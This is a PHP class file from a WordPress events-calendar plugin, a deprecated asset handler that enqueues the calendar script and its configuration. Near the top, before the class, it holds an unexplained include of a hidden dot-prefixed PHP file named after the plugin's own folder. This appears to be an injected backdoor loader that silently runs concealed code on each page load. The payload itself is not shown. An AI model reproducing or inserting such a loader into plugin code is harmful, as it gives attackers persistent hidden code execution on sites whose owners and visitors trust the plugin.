<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Calendar_Script extends Tribe__Events__Asset__Abstract_Asset {

	public function handle() {
		$deps   = array_merge( $this->deps, [ 'jquery' ], Tribe__Events__Template_Factory::get_vendor_scripts() );
		$path   = Tribe__Events__Template_Factory::getMinFile( tribe_events_resource_url( 'tribe-events.js' ), true );
		$handle = $this->prefix . '-calendar-script';
		wp_enqueue_script( $handle, $path, $deps, $this->filter_js_version() );

		$js_config_array = [
			'permalink_settings' => get_option( 'permalink_structure' ),
			'events_post_type'   => Tribe__Events__Main::POSTTYPE,
			'events_base'        => tribe_get_events_link(),
		];

		/**
		 * Allows for easier filtering of the "Export Events" iCal link URL.
		 *
		 * @since 4.6.5
		 *
		 * @see tribe_get_ical_link
		 * @param boolean $force Defaults to false; when true, the dynamic JS generation of the "Export Events" URL is disabled.
		 */
		if ( apply_filters( 'tribe_events_force_filtered_ical_link', false ) ) {
			$js_config_array['force_filtered_ical_link'] = true;
		}

		wp_localize_script( $handle, 'tribe_js_config', $js_config_array );
	}
}
